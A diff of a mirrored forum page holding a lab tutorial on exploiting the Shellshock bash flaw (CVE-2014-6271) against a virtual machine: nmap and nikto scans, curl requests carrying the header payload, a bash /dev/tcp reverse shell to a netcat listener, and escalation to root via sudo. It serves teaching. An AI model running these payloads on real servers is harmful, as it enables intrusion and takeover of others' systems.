@@ -1,28 +1,25 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+<html dir="ltr" id="vbulletin_html" lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml"><!-- Mirrored from garage4hackers.com/printthread.php?t=6902&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:22:25 GMT --><!-- Added by HTTrack --><head><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=6902&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:22:25 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
-<head>
-	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
-	<base  /><!--[if IE]></base><![endif]-->
-	<meta name="generator" content="vBulletin 4.2.1" />
+	<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+	<base/><!--[if IE]></base><![endif]-->
+	<meta content="vBulletin 4.2.1" name="generator"/>
 
 	
-	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
+	<link href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" rel="stylesheet" type="text/css"/>
 	
 
 
 
 	<title> Manually exploiting shellshock Vulnerability</title>
-	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+	<link href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" rel="stylesheet" type="text/css"/>
 
 </head>
 <body>
 
 <div class="above_body">
-<div id="header" class="floatcontainer">
-<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+<div class="floatcontainer" id="header">
+<div><a class="logo-image" href="forum.html" name="top"><img alt="Garage4hackers Forum" src="images/misc/vbulletin4_logo.png"/></a></div>
 </div>
 </div>
 <div class="body_wrapper">
@@ -44,240 +41,240 @@
 		<div class="title">Manually exploiting shellshock Vulnerability</div>
 	
 	<div class="content">
-		<blockquote class="restore">Manually exploiting the shellshock vulnerability, so that you can get a complete picture about how the exploitation of shellshock works.<br />
-It has been given CVE-2014-6271.<br />
-The vulnerability is in Bourne Again Shell (BASH) which we call as shellshock also known as Bashdoor.Many services, such as some web server deployments, use Bash to process certain requests, allowing an attacker to cause vulnerable versions of Bash to execute arbitrary commands. This can allow an attacker to gain unauthorized access to a computer system.<br />
-At first we need to find cgi's that runs system commands and somehow display them to us, If you follow along you can get a good look at the curl too, because we are going to use it along the way.<br />
-To find the cgi's , we can run the dirbuster/dirb/nikto and then  after finding all the cgi scripts we can crossverify via the nmap whether the vulnerability actually exists or not, yes the vulnerability is so critical that it has got a nmap nse script for it. <br />
-I have setup a vm for this in my virtual lab to demonstrate this.<br />
-As usual first we scan the target via nmap(we can do the check here itself, but we'll not we will follow along)<br />
-<br />
-Running nmap:<br />
-<br />
+		<blockquote class="restore">Manually exploiting the shellshock vulnerability, so that you can get a complete picture about how the exploitation of shellshock works.<br/>
+It has been given CVE-2014-6271.<br/>
+The vulnerability is in Bourne Again Shell (BASH) which we call as shellshock also known as Bashdoor.Many services, such as some web server deployments, use Bash to process certain requests, allowing an attacker to cause vulnerable versions of Bash to execute arbitrary commands. This can allow an attacker to gain unauthorized access to a computer system.<br/>
+At first we need to find cgi's that runs system commands and somehow display them to us, If you follow along you can get a good look at the curl too, because we are going to use it along the way.<br/>
+To find the cgi's , we can run the dirbuster/dirb/nikto and then  after finding all the cgi scripts we can crossverify via the nmap whether the vulnerability actually exists or not, yes the vulnerability is so critical that it has got a nmap nse script for it. <br/>
+I have setup a vm for this in my virtual lab to demonstrate this.<br/>
+As usual first we scan the target via nmap(we can do the check here itself, but we'll not we will follow along)<br/>
+<br/>
+Running nmap:<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">root@kali:~# nmap 192.168.0.102 -sV -O -sT <br />
-<br />
-Starting Nmap 7.01 ( https://nmap.org ) at 2016-08-19 14:59 IST<br />
-Nmap scan report for 192.168.0.102<br />
-Host is up (0.00051s latency).<br />
-Not shown: 998 closed ports<br />
-PORT&nbsp;  STATE SERVICE VERSION<br />
-22/tcp open&nbsp; ssh&nbsp; &nbsp;  OpenSSH 6.0 (protocol 2.0)<br />
-80/tcp open&nbsp; http&nbsp; &nbsp; Apache httpd 2.2.21 ((Unix) DAV/2)<br />
-MAC Address: 00:0C:29:19:F6:5E (VMware)<br />
-Device type: general purpose<br />
-Running: Linux 3.X|4.X<br />
-OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br />
-OS details: Linux 3.2 - 4.0<br />
-Network Distance: 1 hop</code><hr />
-</div>now we know what are all the ports open we can run nikto now on port 80 to get a feel what is the scene here.<br />
- <br />
-Running nikto:-<br />
-<br />
+	<hr/><code class="bbcode_code">root@kali:~# nmap 192.168.0.102 -sV -O -sT <br/>
+<br/>
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-08-19 14:59 IST<br/>
+Nmap scan report for 192.168.0.102<br/>
+Host is up (0.00051s latency).<br/>
+Not shown: 998 closed ports<br/>
+PORT   STATE SERVICE VERSION<br/>
+22/tcp open  ssh     OpenSSH 6.0 (protocol 2.0)<br/>
+80/tcp open  http    Apache httpd 2.2.21 ((Unix) DAV/2)<br/>
+MAC Address: 00:0C:29:19:F6:5E (VMware)<br/>
+Device type: general purpose<br/>
+Running: Linux 3.X|4.X<br/>
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br/>
+OS details: Linux 3.2 - 4.0<br/>
+Network Distance: 1 hop</code><hr/>
+</div>now we know what are all the ports open we can run nikto now on port 80 to get a feel what is the scene here.<br/>
+ <br/>
+Running nikto:-<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">root@kali:~# nikto -host 192.168.0.102<br />
-- Nikto v2.1.6<br />
----------------------------------------------------------------------------<br />
-+ Target IP:&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 192.168.0.102<br />
-+ Target Hostname:&nbsp; &nbsp; 192.168.0.102<br />
-+ Target Port:&nbsp; &nbsp; &nbsp; &nbsp; 80<br />
-+ Start Time:&nbsp; &nbsp; &nbsp; &nbsp;  2016-08-19 15:16:56 (GMT5.5)<br />
----------------------------------------------------------------------------<br />
------------------------------------------------------------------------snip-----------------------------------------------------------------------<br />
-+ Uncommon header 'nikto-added-cve-2014-6278' found, with contents: true<br />
-+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).<br />
-+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).<br />
------------------------------------------------------------------------snip-----------------------------------------------------------------------<br />
-+ End Time:&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  2016-08-19 15:17:22 (GMT5.5) (26 seconds)<br />
----------------------------------------------------------------------------<br />
-+ 1 host(s) tested</code><hr />
-</div>Now you can see in the result  that it shows &quot;/cgi-bin/status&quot; is shellshock vulnerable.<br />
-<br />
-we will cross verify the result with the nmap.<br />
-<br />
+	<hr/><code class="bbcode_code">root@kali:~# nikto -host 192.168.0.102<br/>
+- Nikto v2.1.6<br/>
+---------------------------------------------------------------------------<br/>
++ Target IP:          192.168.0.102<br/>
++ Target Hostname:    192.168.0.102<br/>
++ Target Port:        80<br/>
++ Start Time:         2016-08-19 15:16:56 (GMT5.5)<br/>
+---------------------------------------------------------------------------<br/>
+-----------------------------------------------------------------------snip-----------------------------------------------------------------------<br/>
++ Uncommon header 'nikto-added-cve-2014-6278' found, with contents: true<br/>
++ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).<br/>
++ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).<br/>
+-----------------------------------------------------------------------snip-----------------------------------------------------------------------<br/>
++ End Time:           2016-08-19 15:17:22 (GMT5.5) (26 seconds)<br/>
+---------------------------------------------------------------------------<br/>
++ 1 host(s) tested</code><hr/>
+</div>Now you can see in the result  that it shows "/cgi-bin/status" is shellshock vulnerable.<br/>
+<br/>
+we will cross verify the result with the nmap.<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">root@kali:~# nmap 192.168.0.102 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/status<br />
-<br />
-Starting Nmap 7.01 ( https://nmap.org ) at 2016-08-19 15:23 IST<br />
-Nmap scan report for 192.168.0.102<br />
-Host is up (0.00046s latency).<br />
-PORT&nbsp;  STATE SERVICE<br />
-80/tcp open&nbsp; http<br />
-| http-shellshock: <br />
-|&nbsp;  VULNERABLE:<br />
-|&nbsp;  HTTP Shellshock vulnerability<br />
-|&nbsp; &nbsp;  State: VULNERABLE (Exploitable)<br />
-|&nbsp; &nbsp;  IDs:&nbsp; CVE:CVE-2014-6271<br />
-|&nbsp; &nbsp; &nbsp;  This web application might be affected by the vulnerability known as Shellshock. It seems the server<br />
-|&nbsp; &nbsp; &nbsp;  is executing commands injected via malicious HTTP headers.<br />
------------------------------------------------------------------------snip-----------------------------------------------------------------------</code><hr />
-</div>As both the result of nmap and nikto matches we can go for the exploitation of the shellshock vulnerability.<br />
-<br />
-Lets first find out the poc online, simple google &quot;shellshock poc&quot; will get you the desired result at the top, that will be a github link with so many poc's. the poc i chose is the below one:<br />
-<br />
+	<hr/><code class="bbcode_code">root@kali:~# nmap 192.168.0.102 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/status<br/>
+<br/>
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-08-19 15:23 IST<br/>
+Nmap scan report for 192.168.0.102<br/>
+Host is up (0.00046s latency).<br/>
+PORT   STATE SERVICE<br/>
+80/tcp open  http<br/>
+| http-shellshock: <br/>
+|   VULNERABLE:<br/>
+|   HTTP Shellshock vulnerability<br/>
+|     State: VULNERABLE (Exploitable)<br/>
+|     IDs:  CVE:CVE-2014-6271<br/>
+|       This web application might be affected by the vulnerability known as Shellshock. It seems the server<br/>
+|       is executing commands injected via malicious HTTP headers.<br/>
+-----------------------------------------------------------------------snip-----------------------------------------------------------------------</code><hr/>
+</div>As both the result of nmap and nikto matches we can go for the exploitation of the shellshock vulnerability.<br/>
+<br/>
+Lets first find out the poc online, simple google "shellshock poc" will get you the desired result at the top, that will be a github link with so many poc's. the poc i chose is the below one:<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">env X='() { :; }; echo &quot;CVE-2014-6271 vulnerable&quot;' bash -c id</code><hr />
-</div>From now on we will only use curl, not the browser, as i said before i will get you the feel for curl too.<br />
-<br />
-so we will do the curl.<br />
-<br />
+	<hr/><code class="bbcode_code">env X='() { :; }; echo "CVE-2014-6271 vulnerable"' bash -c id</code><hr/>
+</div>From now on we will only use curl, not the browser, as i said before i will get you the feel for curl too.<br/>
+<br/>
+so we will do the curl.<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">root@kali:~# curl -v 192.168.0.102/cgi-bin/status -s &gt; /dev/null<br />
-*&nbsp;  Trying 192.168.0.102...<br />
-* Connected to 192.168.0.102 (192.168.0.102) port 80 (#0)<br />
-&gt; GET /cgi-bin/status HTTP/1.1<br />
-&gt; Host: 192.168.0.102<br />
-&gt; User-Agent: curl/7.47.0<br />
-&gt; Accept: */*<br />
-&gt; <br />
-&lt; HTTP/1.1 200 OK<br />
-&lt; Date: Fri, 19 Aug 2016 15:32:49 GMT<br />
-&lt; Server: Apache/2.2.21 (Unix) DAV/2<br />
-&lt; Content-Length: 177<br />
-&lt; Content-Type: application/json<br />
-&lt; <br />
-{ [177 bytes data]<br />
-* Connection #0 to host 192.168.0.102 left intact</code><hr />
-</div>Now getting a glimpse of the above request below are the parameter that would be needed to successsfuly exploit the vulnerability:<br />
-<br />
-1- The method os reques(like GET /cgi-bin/status HTTP/1.1).<br />
-2. The hostname(like Host: 192.168.0.102).<br />
-3. we can use the useragent too, but its not required<br />
-4. what type of request we are expecting(like Accept: */*).<br />
-<br />
-so now we will try to inject our poc in any of the field above and hope that get executed.<br />
-<br />
-we will try to inject in the User-Agent field first,<br />
-<br />
-Our poc is: <br />
-<br />
+	<hr/><code class="bbcode_code">root@kali:~# curl -v 192.168.0.102/cgi-bin/status -s &gt; /dev/null<br/>
+*   Trying 192.168.0.102...<br/>
+* Connected to 192.168.0.102 (192.168.0.102) port 80 (#0)<br/>
+&gt; GET /cgi-bin/status HTTP/1.1<br/>
+&gt; Host: 192.168.0.102<br/>
+&gt; User-Agent: curl/7.47.0<br/>
+&gt; Accept: */*<br/>
+&gt; <br/>
+&lt; HTTP/1.1 200 OK<br/>
+&lt; Date: Fri, 19 Aug 2016 15:32:49 GMT<br/>
+&lt; Server: Apache/2.2.21 (Unix) DAV/2<br/>
+&lt; Content-Length: 177<br/>
+&lt; Content-Type: application/json<br/>
+&lt; <br/>
+{ [177 bytes data]<br/>
+* Connection #0 to host 192.168.0.102 left intact</code><hr/>
+</div>Now getting a glimpse of the above request below are the parameter that would be needed to successsfuly exploit the vulnerability:<br/>
+<br/>
+1- The method os reques(like GET /cgi-bin/status HTTP/1.1).<br/>
+2. The hostname(like Host: 192.168.0.102).<br/>
+3. we can use the useragent too, but its not required<br/>
+4. what type of request we are expecting(like Accept: */*).<br/>
+<br/>
+so now we will try to inject our poc in any of the field above and hope that get executed.<br/>
+<br/>
+we will try to inject in the User-Agent field first,<br/>
+<br/>
+Our poc is: <br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">'() { :; }; echo &quot;CVE-2014-6271 vulnerable&quot;' bash -c id</code><hr />
-</div>after injecting into User-Agent:<br />
-<br />
+	<hr/><code class="bbcode_code">'() { :; }; echo "CVE-2014-6271 vulnerable"' bash -c id</code><hr/>
+</div>after injecting into User-Agent:<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">'User-Agent: () { :; }; echo &quot;CVE-2014-6271 vulnerable&quot; bash -c id'</code><hr />
-</div>Now lets make the request and hope for the good to happen.<br />
-<br />
+	<hr/><code class="bbcode_code">'User-Agent: () { :; }; echo "CVE-2014-6271 vulnerable" bash -c id'</code><hr/>
+</div>Now lets make the request and hope for the good to happen.<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">root@kali:~# curl -H 'User-Agent: () { :; }; echo &quot;CVE-2014-6271 vulnerable&quot; bash -c id' http://192.168.0.102/cgi-bin/status<br />
-&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;<br />
-&lt;html&gt;&lt;head&gt;<br />
-&lt;title&gt;500 Internal Server Error&lt;/title&gt;<br />
-&lt;/head&gt;&lt;body&gt;<br />
-&lt;h1&gt;Internal Server Error&lt;/h1&gt;<br />
-&lt;p&gt;The server encountered an internal error or<br />
-misconfiguration and was unable to complete<br />
-your request.&lt;/p&gt;<br />
-&lt;p&gt;Please contact the server administrator,<br />
-&nbsp;creaper@creep.com and inform them of the time the error occurred,<br />
-and anything you might have done that may have<br />
-caused the error.&lt;/p&gt;<br />
-&lt;p&gt;More information about this error may be available<br />
-in the server error log.&lt;/p&gt;<br />
-&lt;/body&gt;&lt;/html&gt;</code><hr />
-</div>now we can see it throughs an error.<br />
-Can we give up here, No, becuase i am not, let's try another command by tweaking the command.<br />
-we will now give the complete path as we don't know about the environment variables set on the target machine. we will use &quot;/bin/bash&quot; in place of &quot;bash&quot; and will try to ping our attacking ip with the port so that we can listen on netcat, and finally get to know whether this command is working or not.   <br />
-<br />
-lets try the below:<br />
-<br />
+	<hr/><code class="bbcode_code">root@kali:~# curl -H 'User-Agent: () { :; }; echo "CVE-2014-6271 vulnerable" bash -c id' http://192.168.0.102/cgi-bin/status<br/>
+&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;<br/>
+&lt;html&gt;&lt;head&gt;<br/>
+&lt;title&gt;500 Internal Server Error&lt;/title&gt;<br/>
+&lt;/head&gt;&lt;body&gt;<br/>
+&lt;h1&gt;Internal Server Error&lt;/h1&gt;<br/>
+&lt;p&gt;The server encountered an internal error or<br/>
+misconfiguration and was unable to complete<br/>
+your request.&lt;/p&gt;<br/>
+&lt;p&gt;Please contact the server administrator,<br/>
+ creaper@creep.com and inform them of the time the error occurred,<br/>
+and anything you might have done that may have<br/>
+caused the error.&lt;/p&gt;<br/>
+&lt;p&gt;More information about this error may be available<br/>
+in the server error log.&lt;/p&gt;<br/>
+&lt;/body&gt;&lt;/html&gt;</code><hr/>
+</div>now we can see it throughs an error.<br/>
+Can we give up here, No, becuase i am not, let's try another command by tweaking the command.<br/>
+we will now give the complete path as we don't know about the environment variables set on the target machine. we will use "/bin/bash" in place of "bash" and will try to ping our attacking ip with the port so that we can listen on netcat, and finally get to know whether this command is working or not.   <br/>
+<br/>
+lets try the below:<br/>
+<br/>
 Before: <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">'User-Agent: () { :; }; echo &quot;CVE-2014-6271 vulnerable&quot; bash -c id'</code><hr />
+	<hr/><code class="bbcode_code">'User-Agent: () { :; }; echo "CVE-2014-6271 vulnerable" bash -c id'</code><hr/>
 </div>After: <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">'User-Agent: () { :; }; /bin/bash -c 'ping -c 3 192.168.0.101:1234''</code><hr />
-</div>now we will listen on port 1234 on netcat.<br />
-<br />
-nc -lvp 1234<br />
-<br />
-let fire this up:<br />
-<br />
+	<hr/><code class="bbcode_code">'User-Agent: () { :; }; /bin/bash -c 'ping -c 3 192.168.0.101:1234''</code><hr/>
+</div>now we will listen on port 1234 on netcat.<br/>
+<br/>
+nc -lvp 1234<br/>
+<br/>
+let fire this up:<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">root@kali:~# nc -lvp 1234<br />
-listening on [any] 1234 ...</code><hr />
-</div>Now sending the request to the target server:<br />
-<br />
+	<hr/><code class="bbcode_code">root@kali:~# nc -lvp 1234<br/>
+listening on [any] 1234 ...</code><hr/>
+</div>Now sending the request to the target server:<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">root@kali:~# curl -H 'User-Agent: () { :; }; /bin/bash -c 'ping -c 3 192.168.0.101:1234'' http://192.168.0.102/cgi-bin/status</code><hr />
-</div>Now after sending the request the console stops doesn't give any output, but when we have a good look at our netcat we can see the below:<br />
-<br />
+	<hr/><code class="bbcode_code">root@kali:~# curl -H 'User-Agent: () { :; }; /bin/bash -c 'ping -c 3 192.168.0.101:1234'' http://192.168.0.102/cgi-bin/status</code><hr/>
+</div>Now after sending the request the console stops doesn't give any output, but when we have a good look at our netcat we can see the below:<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">root@kali:~# nc -lvp 1234<br />
-listening on [any] 1234 ...<br />
-connect to [192.168.0.101] from kali [192.168.0.101] 42144<br />
-GET / HTTP/1.1<br />
-Host: 192.168.0.101:1234<br />
-Accept: */*<br />
-User-Agent: () { :; }; /bin/bash -c ping</code><hr />
-</div>Voila, we are getting the command executed.<br />
-Now we know our poc finally works.So now our next task is to get a reverse shell, lets try that too.<br />
-<br />
-lets create a listener on attacking machine on port 1234.<br />
-<br />
+	<hr/><code class="bbcode_code">root@kali:~# nc -lvp 1234<br/>
+listening on [any] 1234 ...<br/>
+connect to [192.168.0.101] from kali [192.168.0.101] 42144<br/>
+GET / HTTP/1.1<br/>
+Host: 192.168.0.101:1234<br/>
+Accept: */*<br/>
+User-Agent: () { :; }; /bin/bash -c ping</code><hr/>
+</div>Voila, we are getting the command executed.<br/>
+Now we know our poc finally works.So now our next task is to get a reverse shell, lets try that too.<br/>
+<br/>
+lets create a listener on attacking machine on port 1234.<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">root@kali:~# nc -lvp 1234<br />
-listening on [any] 1234 ...</code><hr />
-</div>we will use the below command to get a reverse shell, reference from pentestmonkey website.<br />
-<br />
+	<hr/><code class="bbcode_code">root@kali:~# nc -lvp 1234<br/>
+listening on [any] 1234 ...</code><hr/>
+</div>we will use the below command to get a reverse shell, reference from pentestmonkey website.<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.101/1234 0&gt;&amp;1</code><hr />
-</div>fire the below command in the User-Agent<br />
-<br />
+	<hr/><code class="bbcode_code">/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.101/1234 0&gt;&amp;1</code><hr/>
+</div>fire the below command in the User-Agent<br/>
+<br/>
 Before: <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">'User-Agent: () { :; }; /bin/bash -c 'ping -c 3 192.168.0.101:1234''</code><hr />
+	<hr/><code class="bbcode_code">'User-Agent: () { :; }; /bin/bash -c 'ping -c 3 192.168.0.101:1234''</code><hr/>
 </div>After: <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">'User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.101/1234 0&gt;&amp;1'</code><hr />
-</div>&quot;/bin/bash -i&quot; because we want the command and things to be interactive.<br />
-<br />
-this command is very useful when you don't have any netcat installed on the target machine or server.Make note of this command :-) .<br />
-<br />
-Finally time to blast:<br />
-<br />
+	<hr/><code class="bbcode_code">'User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.101/1234 0&gt;&amp;1'</code><hr/>
+</div>"/bin/bash -i" because we want the command and things to be interactive.<br/>
+<br/>
+this command is very useful when you don't have any netcat installed on the target machine or server.Make note of this command :-) .<br/>
+<br/>
+Finally time to blast:<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">root@kali:~# curl -H 'User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.101/1234 0&gt;&amp;1' http://192.168.0.102/cgi-bin/status</code><hr />
-</div>Now have a innocent look on the netcat console:<br />
-<br />
+	<hr/><code class="bbcode_code">root@kali:~# curl -H 'User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.101/1234 0&gt;&amp;1' http://192.168.0.102/cgi-bin/status</code><hr/>
+</div>Now have a innocent look on the netcat console:<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">root@kali:~# nc -lvp 1234<br />
-listening on [any] 1234 ...<br />
-192.168.0.102: inverse host lookup failed: Unknown host<br />
-connect to [192.168.0.101] from (UNKNOWN) [192.168.0.102] 53743<br />
-bash: no job control in this shell<br />
-bash-4.2$ id<br />
-id<br />
-uid=1000(creep) gid=50(staff) groups=50(staff),100(creep)<br />
-bash-4.2$</code><hr />
-</div>Awesome we have a got a reverse shell, we can get the root shell via sudo -s as the user is a part of sudoers.<br />
-<br />
+	<hr/><code class="bbcode_code">root@kali:~# nc -lvp 1234<br/>
+listening on [any] 1234 ...<br/>
+192.168.0.102: inverse host lookup failed: Unknown host<br/>
+connect to [192.168.0.101] from (UNKNOWN) [192.168.0.102] 53743<br/>
+bash: no job control in this shell<br/>
+bash-4.2$ id<br/>
+id<br/>
+uid=1000(creep) gid=50(staff) groups=50(staff),100(creep)<br/>
+bash-4.2$</code><hr/>
+</div>Awesome we have a got a reverse shell, we can get the root shell via sudo -s as the user is a part of sudoers.<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">bash-4.2$ sudo -s<br />
-sudo -s<br />
-id<br />
-uid=0(root) gid=0(root) groups=0(root)</code><hr />
-</div>Finally our main objective was to do shellshock manually which we did successfully<br />
-<br />
-Things are not always easy as shown here we need to try many possibilities like how server behaves, environmental variables and many more. however i hope this aticle will get you to read any exploit available publically and make required modifications as real world senarios are always surprising and if you are not aware of how things work, you can get yourself in trouble.<br />
-<br />
+	<hr/><code class="bbcode_code">bash-4.2$ sudo -s<br/>
+sudo -s<br/>
+id<br/>
+uid=0(root) gid=0(root) groups=0(root)</code><hr/>
+</div>Finally our main objective was to do shellshock manually which we did successfully<br/>
+<br/>
+Things are not always easy as shown here we need to try many possibilities like how server behaves, environmental variables and many more. however i hope this aticle will get you to read any exploit available publically and make required modifications as real world senarios are always surprising and if you are not aware of how things work, you can get yourself in trouble.<br/>
+<br/>
 Have Fun...</blockquote>
 	</div>
 </li>
@@ -286,14 +283,14 @@ Have Fun...</blockquote>
 
 </div>
 <div class="below_body">
-<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">05:04 PM</span>.</div>
+<div class="footer_time" id="footer_time">All times are GMT +5.5. The time now is <span class="time">05:04 PM</span>.</div>
 
-<div id="footer_copyright" class="footer_copyright">
+<div class="footer_copyright" id="footer_copyright">
 	<!-- Do not remove this copyright notice -->
-	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
 	<!-- Do not remove this copyright notice -->	
 </div>
-<div id="footer_morecopyright" class="footer_morecopyright">
+<div class="footer_morecopyright" id="footer_morecopyright">
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
 	
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
@@ -311,7 +308,7 @@ try{
 var pageTracker = _gat._getTracker('UA-17311051-3');
 pageTracker._trackPageview();
 } catch(err) {}</script>
-</body>
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=6902&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:22:25 GMT -->
-</html>
+
+
+</body><!-- Mirrored from garage4hackers.com/printthread.php?t=6902&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:22:25 GMT --></html>
